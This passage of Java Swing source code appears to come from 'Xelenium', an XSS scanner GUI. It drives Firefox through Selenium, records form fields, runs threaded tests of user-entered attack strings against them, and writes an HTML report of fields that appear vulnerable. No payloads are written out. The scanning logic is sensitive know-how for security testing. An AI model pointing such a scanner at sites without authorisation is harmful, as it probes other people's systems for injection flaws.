            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void Clear_btnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Clear_btnActionPerformed
        // TODO add your handling code here:
        Log_Textarea.setText("");
    }//GEN-LAST:event_Clear_btnActionPerformed

    private void IncludeActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_IncludeActionPerformed
        // TODO add your handling code here:
        String atk_vctr = Atk_Vctr_TxtField.getText();
        if (!(atk_vctr.equalsIgnoreCase(""))) {
            Vector<String> avl_list = new Vector<String>();
            for (int c = 0; c < Avl_Atk_Vctr.getModel().getSize(); c++) {
                avl_list.add((String) Avl_Atk_Vctr.getModel().getElementAt(c));
            }
            avl_list.add((String) atk_vctr);
            Avl_Atk_Vctr.setListData(avl_list);
            Atk_Vctr_TxtField.setText("");
        }
    }//GEN-LAST:event_IncludeActionPerformed

    private void RemoveActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_RemoveActionPerformed
        // TODO add your handling code here:
        int atk_indices[] = Sel_Atk_Vctr.getSelectedIndices();
        Vector<String> sel_list = new Vector<String>();
        Vector<String> avl_list = new Vector<String>();
        for (int a = 0; a < Sel_Atk_Vctr.getModel().getSize(); a++) {
            sel_list.add((String) Sel_Atk_Vctr.getModel().getElementAt(a));
        }
        for (int c = 0; c < Avl_Atk_Vctr.getModel().getSize(); c++) {
            avl_list.add((String) Avl_Atk_Vctr.getModel().getElementAt(c));
        }
        for (int b = 0; b < atk_indices.length; b++) {
            avl_list.add((String) Sel_Atk_Vctr.getModel().getElementAt(atk_indices[b]));
            sel_list.remove((String) Sel_Atk_Vctr.getModel().getElementAt(atk_indices[b]));
        }
        Sel_Atk_Vctr.setListData(sel_list);
        Avl_Atk_Vctr.setListData(avl_list);
    }//GEN-LAST:event_RemoveActionPerformed

    private void DeleteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_DeleteActionPerformed
        // TODO add your handling code here:
        int atk_indices[] = Avl_Atk_Vctr.getSelectedIndices();
        Vector<String> avl_list = new Vector<String>();
        for (int a = 0; a < Avl_Atk_Vctr.getModel().getSize(); a++) {
            avl_list.add((String) Avl_Atk_Vctr.getModel().getElementAt(a));
        }
        for (int b = 0; b < atk_indices.length; b++) {
            avl_list.remove((String) Avl_Atk_Vctr.getModel().getElementAt(atk_indices[b]));
        }
        Avl_Atk_Vctr.setListData(avl_list);
    }//GEN-LAST:event_DeleteActionPerformed

    private void AddActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_AddActionPerformed
        // TODO add your handling code here:
        int atk_indices[] = Avl_Atk_Vctr.getSelectedIndices();
        Vector<String> sel_list = new Vector<String>();
        Vector<String> avl_list = new Vector<String>();
        for (int a = 0; a < Sel_Atk_Vctr.getModel().getSize(); a++) {
            sel_list.add((String) Sel_Atk_Vctr.getModel().getElementAt(a));
        }
        for (int c = 0; c < Avl_Atk_Vctr.getModel().getSize(); c++) {
            avl_list.add((String) Avl_Atk_Vctr.getModel().getElementAt(c));
        }

        for (int b = 0; b < atk_indices.length; b++) {
            sel_list.add((String) Avl_Atk_Vctr.getModel().getElementAt(atk_indices[b]));
            avl_list.remove((String) Avl_Atk_Vctr.getModel().getElementAt(atk_indices[b]));
        }
        Sel_Atk_Vctr.setListData(sel_list);
        Avl_Atk_Vctr.setListData(avl_list);
    }//GEN-LAST:event_AddActionPerformed

    private void Pwd_Protected_chkboxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Pwd_Protected_chkboxActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_Pwd_Protected_chkboxActionPerformed

    private void Pwd_Protected_chkboxItemStateChanged(java.awt.event.ItemEvent evt) {//GEN-FIRST:event_Pwd_Protected_chkboxItemStateChanged
        // TODO add your handling code here:

        Uname_txt_field.setText("");
        Pwd_txt_field.setText("");
        Uname_txt_field.setEnabled(!(Uname_txt_field.isEnabled()));
        Pwd_txt_field.setEnabled(!(Pwd_txt_field.isEnabled()));
    }//GEN-LAST:event_Pwd_Protected_chkboxItemStateChanged

    private void Pwd_Protected_chkboxMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_Pwd_Protected_chkboxMouseClicked
        // TODO add your handling code here:
    }//GEN-LAST:event_Pwd_Protected_chkboxMouseClicked

    private void Pwd_txt_fieldActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Pwd_txt_fieldActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_Pwd_txt_fieldActionPerformed

    private void Perform_XSSScanActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Perform_XSSScanActionPerformed
        BufferedWriter bw = null;
        logFlag = "true";
        logincreds = "";


         if(pre_def_url_ind != -1){         //to ensure that predefined values are captured when user defined values and did not trigger event in captured urls dropdown
            Predef_field_values();
       }
        
        

        if (Pwd_Protected_chkbox.isSelected()) {
            if ((!((Uname_txt_field.getText()).equalsIgnoreCase("")) & (!((Pwd_txt_field.getText()).equalsIgnoreCase(""))))) {
                logincreds = Uname_txt_field.getText();
                logincreds = logincreds + "<>";
                logincreds = logincreds + Pwd_txt_field.getText();
            } else {
                //Raise exception that the username and password are not provided
            }
        }
        try {
            // TODO add your handling code here:



            String[] urls_scan = new String[Captured_Pages_List.getModel().getSize()];
            File f = new File("source.htm");
            bw = new BufferedWriter(new FileWriter(f));

            //bw.write("<HTML><BODY><TABLE BORDER=1 CELLPADDING=3 CELLSPACING=1 WIDTH=100%>");
            //bw.write("<TR><TD BGCOLOR=#66699 WIDTH=27% align=\"center\"><FONT FACE=VERDANA COLOR=WHITE SIZE=2><B>XSS Scanner Results</B></FONT></TD></TR>");

            bw.write("<html><head><title>Results</title></head>");
            bw.write("<style>* { font-family: arial; }div.title { font-size:3em;font-weight: bold;padding-top: 24px;padding-left: 25px;}");
            bw.write("h2{padding-left: 5px;margin-bottom: 0px;padding-bottom: 0;background-color: #001f47;color:#fff;border: 1px solid black;text-align:center;}");
            bw.write("h3{padding-left: 5px;margin-top:5px;margin-bottom: 0px;font-size:1em;padding-bottom: 0;background-color: #B0C4DE;color:#000000;border: 1px solid black;text-align:left;}");
            bw.write("div.url{padding-left: 5px;margin-top:5px;margin-right:0px;margin-bottom: 5px;background-color:#778899;color:#000000;border: 1px solid black;text-align:left;}");
            bw.write("div.scan{padding-left: 5px;margin-right:5px;margin-top:5px;margin-bottom: 5px;background-color:#D6DBE0;color:#000000;border: 1px solid black;text-align:left;}");
            bw.write(".fail {background-color: #C00000;border: 1px solid black;}");   //color: #fff;
            bw.write(".pass {background-color:#00B050;border: 1px solid black;}");
            bw.write(".results div.pass, .results div.warn, .results div.fail{margin-bottom: 5px;margin-left: 40px;padding: 5px;}");
            bw.write("td.bar {width: 99%;background-color: #dddddd;border: 1px solid black;padding: 0;margin: 0;text-align: center;}");
            bw.write("h4{padding-left: 5px;margin-top:5px;margin-bottom: 0px;margin-right:5px;margin-bottom:5px;font-size:1em;padding-bottom: 0;background-color: #001f47;color:#fff;border: 1px solid black;text-align:left;}</style>");
            bw.write("<BODY>");
            bw.write("<h2>Xelenium</h2>");
            bw.write("<h3>XSS(Cross Site Scripting) Scanner Results</h3>");
            Date date = new Date();
            bw.write("<h3>Scan performed on : " + date.toString() + "</h3>");

            for (int j = 0; j < urls_scan.length; j++) {
                Update_Log("XSS Scanning has started for the web page " + (String) Captured_Pages_List.getModel().getElementAt(j));
                System.setOut(new PrintStream(myOut));
                bw.write("<div class='url'> URL : " + (String) Captured_Pages_List.getModel().getElementAt(j));
                Thread Thrd[] = new Thread[Sel_Atk_Vctr.getModel().getSize()];

                for (int i = 0; i < Sel_Atk_Vctr.getModel().getSize(); i++) {
                    Thrd[i] = new WebScan(j + (String) Captured_Pages_List.getModel().getElementAt(j), i + (String) Sel_Atk_Vctr.getModel().getElementAt(i), this);
                    Thrd[i].start();
                   
                }

                for (int t = 0; t < Sel_Atk_Vctr.getModel().getSize(); t++) {
                    try {
                        Thrd[t].join();
                    } catch (Exception ex) {
                        Update_Log(Arrays.toString(ex.getStackTrace()));
                        /*Date_logger = new Date();
                        log_text = Log_Textarea.getText();
                        Log_Textarea.setText(log_text + "\r\n" + Date_logger + ":" + ex.toString());
                        Logger.getLogger(Xelenium.class.getName()).log(Level.SEVERE, null, ex);
                        log_text = "";*/
                    }
                }

                TreeSet<String> keys = new TreeSet<String>(map.keySet());
                String txt_key = "";
                float pass_cnt = 0;
                float fail_cnt = 0;
                float warn_cnt = 0;
                String res;
                String html_update = "";
                //String trow_data1 = "<TR COLS=10>";
                //String trow_data2 = "<TR COLS=10>";
                for (String key : keys) {
                    if (!(txt_key.endsWith(key.substring(3)))) {
                        if (!(txt_key.equalsIgnoreCase(""))) {
                            bw.write("<h4> Test Summary (No of tests executed :" + (int) (pass_cnt + fail_cnt + warn_cnt) + ")</h4>");
                            bw.write("<table style='width: 100%'><tbody><tr><td nowrap='nowrap'>Failures:</td><td class='bar'><div style='width:" + ((fail_cnt / (pass_cnt + fail_cnt + warn_cnt)) * 100) + "%;'class='fail'>" + (int) fail_cnt + "</div></td></tr>");
                            //bw.write("<tr><td nowrap='nowrap'>Warnings:</td><td class='bar'><div style='width:" + ((warn_cnt/(pass_cnt+fail_cnt+warn_cnt))*100) + "%;'class='warn'>"+ (int)warn_cnt +"</div></td></tr>");
                            bw.write("<tr><td nowrap='nowrap'>Passes:</td><td class='bar'><div style='width:" + ((pass_cnt / (pass_cnt + fail_cnt + warn_cnt)) * 100) + "%;'class='pass'>" + (int) pass_cnt + "</div></td></tr></tbody></table>");
                            if (!(html_update.equalsIgnoreCase(""))) {
                                bw.write("<h4>XSS String Test Results</h4>");
                                bw.write("<div class='results'><b>Results:</b><br />");
                                bw.write(html_update);
                                bw.write("</div>");
                            }

                            bw.write("</div>");
                            //bw.write("</div>");
                            pass_cnt = 0;
                            fail_cnt = 0;
                            warn_cnt = 0;
                            html_update = "";
                        }
                        txt_key = key;
                        String key_ext = key.substring(3);
                        String[] arrkeys = key_ext.split("<>");
                        bw.write("<div class='scan'>Text Field : " + arrkeys[0] + ", Button : " + arrkeys[1]);
                    }
                    res = map.get(key);

                    if (res.equalsIgnoreCase("0")) {
                        pass_cnt = pass_cnt + 1;
                    } else if (res.equalsIgnoreCase("1")) {
                        fail_cnt = fail_cnt + 1;
                        String avctr_ind = key.substring(2, 3);
                        String atk_vctr = (String) Sel_Atk_Vctr.getModel().getElementAt(Integer.parseInt(avctr_ind));
                        String escapedVctr = StringEscapeUtils.escapeHtml(atk_vctr);
                        html_update = html_update + "<div class='fail'>Field appears to be vulnerable to the below mentioned XSS String.<br />Tested value: " + escapedVctr + "</div>";
                    } else if (res.equalsIgnoreCase("-1")) {
                        warn_cnt = warn_cnt + 1;


                    }
                }

                bw.write("<h4> Test Summary (No of tests executed :" + (int) (pass_cnt + fail_cnt + warn_cnt) + ")</h4>");
                bw.write("<table style='width: 100%'><tbody><tr><td nowrap='nowrap'>Failures:</td><td class='bar'><div style='width:" + ((fail_cnt / (pass_cnt + fail_cnt + warn_cnt)) * 100) + "%;'class='fail'>" + (int) fail_cnt + "</div></td></tr>");
                //bw.write("<tr><td nowrap='nowrap'>Warnings:</td><td class='bar'><div style='width:" + ((warn_cnt/(pass_cnt+fail_cnt+warn_cnt))*100) + "%;'class='warn'>"+ (int) warn_cnt +"</div></td></tr>");
                bw.write("<tr><td nowrap='nowrap'>Passes:</td><td class='bar'><div style='width:" + ((pass_cnt / (pass_cnt + fail_cnt + warn_cnt)) * 100) + "%;'class='pass'>" + (int) pass_cnt + "</div></td></tr></tbody></table>");
                if (!(html_update.equalsIgnoreCase(""))) {
                    bw.write("<h4>XSS String Test Results</h4>");
                    bw.write("<div class='results'><b>Results:</b><br />");
                    bw.write(html_update);
                }
                bw.write("</div>");
                bw.write("</div>");
                bw.write("</div>");
                this.map = new HashMap<String, String>();
                //  bw.write("</div>");
                myOut = new ByteArrayOutputStream();
                this.stdOput = "";
            }

            bw.write("</body>");
            bw.write("</html>");
            bw.close();
            Desktop.getDesktop().browse(f.toURI());
        } catch (Exception ex) {
            Logger.getLogger(Xelenium.class.getName()).log(Level.SEVERE, null, ex);
            Update_Log(ex.toString());
            /*Date_logger = new Date();
            log_text = Log_Textarea.getText();
            Log_Textarea.setText(log_text + "\r\n" + Date_logger + ": " + ex.toString());
            log_text = "";*/
        } finally {
            try {
                bw.close();
            } catch (IOException ex) {
                Update_Log("Exception occurred while updating the results in html file. Please check the Mozilla Firefox installation/processes in the system");
                /*
                Date_logger = new Date();
                log_text = Log_Textarea.getText();
                Log_Textarea.setText(log_text + "\r\n" + Date_logger + ": " + ex.toString());
                Logger.getLogger(Xelenium.class.getName()).log(Level.SEVERE, null, ex);
                log_text = "";*/
            }
        }
    }//GEN-LAST:event_Perform_XSSScanActionPerformed

    private void Remove_BtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Remove_BtnActionPerformed
        // TODO add your handling code here:
        int[] rem_urls;
        rem_urls = Captured_Pages_List.getSelectedIndices();
        for (int i = rem_urls.length; i > 0; i--) {
            myVector.remove(rem_urls[i - 1]);
            if(Captured_URLs.getItemCount()==1){        //Code to handle the scenario of removing the last item from 'Captured Urls' combobox
                pre_def_url_ind=-1;
                Pre_Def_Fields.removeAll();
                Pre_Def_Fields.updateUI();
            }
            Captured_URLs.removeItemAt(rem_urls[i-1]);
            predef_urls.remove(rem_urls[i-1]);
        }
        Captured_Pages_List.setListData(myVector);
        pre_def_url_ind = Captured_URLs.getSelectedIndex();
    }//GEN-LAST:event_Remove_BtnActionPerformed

    private void Capture_PagesActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Capture_PagesActionPerformed
        // TODO add your handling code here:

        String URL_prov = URL_Txt_Field.getText();

        if (!(URL_prov.equalsIgnoreCase(""))) {

            if ((URL_prov.startsWith("http://")) || (URL_prov.startsWith("https://"))) {

                FirefoxDriver d1 = new FirefoxDriver();
                
                d1.get(URL_Txt_Field.getText());

                String URLs[] = new String[1];
                String Dum_URLs[] = new String[1];
                String xUrl;
                URLs[0] = d1.getCurrentUrl();
                Dum_URLs[0] = d1.getCurrentUrl();
                Capture_Fields(d1,Captured_URLs.getItemCount());
                try {
                    while (true) {
                        xUrl = d1.getCurrentUrl();
                        if (!((URLs[URLs.length - 1]).equalsIgnoreCase(xUrl))) {
                            
                            Dum_URLs = new String[Dum_URLs.length + 1];
                            System.arraycopy(URLs, 0, Dum_URLs, 0, URLs.length);
                            Dum_URLs[Dum_URLs.length - 1] = d1.getCurrentUrl();
                            URLs = new String[URLs.length + 1];
                            System.arraycopy(Dum_URLs, 0, URLs, 0, Dum_URLs.length);
                            Capture_Fields(d1,Captured_URLs.getItemCount() + URLs.length-1);
                            try {
                                Thread.sleep(500);
                            } catch (InterruptedException ex) {
                                Logger.getLogger(Xelenium.class.getName()).log(Level.SEVERE, null, ex);
                            }
                        }
                    }
                } catch (org.openqa.selenium.WebDriverException ex1) {
                    //DefaultListModel listmodel = new DefaultListModel();
                    for (int i = 0; i < URLs.length; i++) {
                        myVector.add(URLs[i]);
                        if(Captured_URLs.getItemCount()==0){
                            pre_def_url_ind = 0;
                        }
                        Captured_URLs.addItem(URLs[i]);
                    }
                    Captured_Pages_List.setListData(myVector);
                    Predef_field_values();
                }
            } else {
                //Please provide valid url starting with http or https;
                Update_Log("URL Error - Please provide the valid url, starting with http or https.");
                /*Date_logger = new Date();
                log_text = Log_Textarea.getText();
                Log_Textarea.setText(log_text + "\r\n" + Date_logger + ": URL Error - Please provide the valid url, starting with http or https.");
                log_text = ""; */
            }
        }//GEN-LAST:event_Capture_PagesActionPerformed
    }
        
        private void Captured_URLsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Captured_URLsActionPerformed
        // TODO add your handling code here:
       if(pre_def_url_ind != -1){
            Predef_field_values();
       }
    }//GEN-LAST:event_Captured_URLsActionPerformed

    private void Captured_URLsItemStateChanged(java.awt.event.ItemEvent evt) {//GEN-FIRST:event_Captured_URLsItemStateChanged
        // TODO add your handling code here:
        
    }//GEN-LAST:event_Captured_URLsItemStateChanged

    private void URL_Txt_FieldKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_URL_Txt_FieldKeyPressed
        // TODO add your handling code here:
    }//GEN-LAST:event_URL_Txt_FieldKeyPressed

    private void URL_Txt_FieldActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_URL_Txt_FieldActionPerformed
        // TODO add your handling code here:
        Capture_PagesActionPerformed(evt);
    }//GEN-LAST:event_URL_Txt_FieldActionPerformed
    
    private void Predef_field_values(){
            
            Map<String,String> txt_fields = predef_urls.get(pre_def_url_ind);
            if(txt_bx!=null){
            for(int p_ind=0;p_ind<txt_bx.length;p_ind++){
                String txt_val = txt_fields.get(new Integer(p_ind).toString());
                String [] arr_val = txt_val.split("<>");
                
                String cmp_val;
                if(arr_val.length==2){
                    cmp_val = arr_val[1];
                }else{
                    cmp_val = "";
                }
                    if(!(cmp_val.equals(txt_bx[p_ind].getText()))){
                        txt_val = arr_val[0] + "<>" + txt_bx[p_ind].getText();
                        txt_fields.put(new Integer(p_ind).toString(), txt_val);
                        if(p_ind==txt_bx.length-1){
                            Update_Predef_Values(pre_def_url_ind,txt_fields);
                        }
                    }
                }
                
            }
             Pre_Def_Fields.removeAll();
             Pre_Def_Fields.updateUI();
             int url_index = Captured_URLs.getSelectedIndex();
             pre_def_url_ind = url_index;
             txt_fields = predef_urls.get(url_index);
            
            txtbx_lbl = new JLabel[txt_fields.size()];
            txt_bx = new JTextField[txt_fields.size()];
            String [] lbl_val;
            
            javax.swing.GroupLayout Pre_Def_FieldsLayout = new javax.swing.GroupLayout(Pre_Def_Fields);
            
            ParallelGroup lbl_grp_hor = Pre_Def_FieldsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING);
            ParallelGroup txtbx_grp_hor = Pre_Def_FieldsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING,false);
            
            for(int e=0;e<txt_fields.size();e++){
                txtbx_lbl[e] = new JLabel();
                txt_bx[e] = new JTextField();
                lbl_val = txt_fields.get(new Integer(e).toString()).split("<>");
                txtbx_lbl[e].setText(lbl_val[0] + " :");
                if(lbl_val.length==2){
                    txt_bx[e].setText("");
                    txt_bx[e].setText(lbl_val[1]);
                }
                lbl_grp_hor = lbl_grp_hor.addComponent(txtbx_lbl[e],javax.swing.GroupLayout.PREFERRED_SIZE, 100, javax.swing.GroupLayout.PREFERRED_SIZE);
                txtbx_grp_hor = txtbx_grp_hor.addComponent(txt_bx[e],javax.swing.GroupLayout.DEFAULT_SIZE, 217, Short.MAX_VALUE);
            }
        
          
        Pre_Def_Fields.setLayout(Pre_Def_FieldsLayout);
        Pre_Def_FieldsLayout.setHorizontalGroup(
            Pre_Def_FieldsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(Pre_Def_FieldsLayout.createSequentialGroup()
                .addGap(25, 25, 25)
                .addGroup(lbl_grp_hor)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(txtbx_grp_hor)
                .addContainerGap(279, Short.MAX_VALUE))
        );
        
       ParallelGroup[] txt_par_grp = new ParallelGroup[txt_fields.size()];
        
               
       for(int e=0;e<txt_fields.size();e++){
           txt_par_grp[e] = Pre_Def_FieldsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                .addComponent(txtbx_lbl[e])
                .addComponent(txt_bx[e], javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE);}
        
       SequentialGroup txt_seq_grp = Pre_Def_FieldsLayout.createSequentialGroup();
       
       for(int e=0;e<txt_fields.size();e++){
           txt_seq_grp.addGap(30,30,30)
                   .addGroup(txt_par_grp[e]);
       }
       txt_seq_grp.addContainerGap(280,Short.MAX_VALUE);
       
       Pre_Def_FieldsLayout.setVerticalGroup(Pre_Def_FieldsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING).addGroup(txt_seq_grp));
       
                
    }

    private void Update_Predef_Values(int url_ind, Map<String, String> values){
        List<Map<String,String>> dum_predef_urls = new ArrayList<Map<String,String>>();
        for(int i=0;i<predef_urls.size();i++){
            if(i==url_ind){
                dum_predef_urls.add(values);
            }else{
                dum_predef_urls.add(predef_urls.get(i));
            }
        }
        predef_urls = null;
        predef_urls = dum_predef_urls;        
    }
    
    public void Update_Log(String log_text){
            Date_logger = new Date();
            String pres_text = Log_Textarea.getText();
            Log_Textarea.setText(pres_text + "\r\n" + Date_logger + ": " + log_text);
    }
    
    private void Capture_Fields(FirefoxDriver d, int url_index){
        List<WebElement> cap_elem = d.findElements(By.tagName("input"));
        int k=0;
        Map<String,String> predef_fields = new HashMap<String,String>();
        for(WebElement elem:cap_elem){
            String type_attr = elem.getAttribute("type");
            if((type_attr.equalsIgnoreCase("text"))|| (type_attr.equalsIgnoreCase("password")))  {
                String fld_id = elem.getAttribute("id");
                if(fld_id.equalsIgnoreCase("")){
                    fld_id = elem.getAttribute("name");
                }
                if(fld_id.equalsIgnoreCase("")){
                    fld_id = "text_field_" + k;
                }
                predef_fields.put(new Integer(k).toString(), fld_id +"<>");
                k=k+1;
            }
        }
        
        List<WebElement> tarea_elems = d.findElements(By.tagName("textarea"));
		
		if (tarea_elems.size()!=0){
			for (WebElement tarea:tarea_elems){
                                String fld_id = tarea.getAttribute("id");
                           if(fld_id.equalsIgnoreCase("")){
                                fld_id = tarea.getAttribute("name");
                            }
                            if(fld_id.equalsIgnoreCase("")){
                                fld_id = "text_field_" + k;
                            }
                        predef_fields.put(new Integer(k).toString(), fld_id +"<>");
                        k=k+1;
			}
		}
        
        predef_urls.add(url_index, predef_fields);
    }
    
    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /*
         * Set the Nimbus look and feel
         */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /*
         * If Nimbus (introduced in Java SE 6) is not available, stay with the
         * default look and feel. For details see
         * http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Xelenium.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Xelenium.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Xelenium.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Xelenium.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /*
         * Create and display the form
         */
        java.awt.EventQueue.invokeLater(new Runnable() {

            public void run() {
                new Xelenium().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton Add;
    private javax.swing.JTextField Atk_Vctr_TxtField;
    private javax.swing.JPanel Attack_Vectors;
    private javax.swing.JList Avl_Atk_Vctr;
    private javax.swing.JButton Capture_Pages;
    private javax.swing.JPanel Capture_Scan;
    private javax.swing.JPanel Capture_Scan_Tab;
    private javax.swing.JList Captured_Pages_List;
    private javax.swing.JComboBox Captured_URLs;
    private javax.swing.JButton Clear_btn;
    private javax.swing.JButton Delete;
    private javax.swing.JButton Include;
    private javax.swing.JTextArea Log_Textarea;
    private javax.swing.JButton Perform_XSSScan;
    private javax.swing.JPanel Pre_Def_Fields;
    private javax.swing.JPanel Predefine_Values_Tab;
    private javax.swing.JCheckBox Pwd_Protected_chkbox;
    private javax.swing.JTextField Pwd_txt_field;
    private javax.swing.JButton Remove;
    private javax.swing.JButton Remove_Btn;
    private javax.swing.JList Sel_Atk_Vctr;
    private javax.swing.JTextField URL_Txt_Field;
    private javax.swing.JTextField Uname_txt_field;
    private javax.swing.JTabbedPane Xelenium;
    private javax.swing.JFrame jFrame1;
    private javax.swing.JFrame jFrame2;
    private javax.swing.JFrame jFrame3;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel5;
    private javax.swing.JPanel jPanel6;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JScrollPane jScrollPane4;
    private javax.swing.JScrollPane jScrollPane5;
    private javax.swing.JTabbedPane jTabbedPane1;
    private javax.swing.JTabbedPane jTabbedPane2;
    // End of variables declaration//GEN-END:variables
}
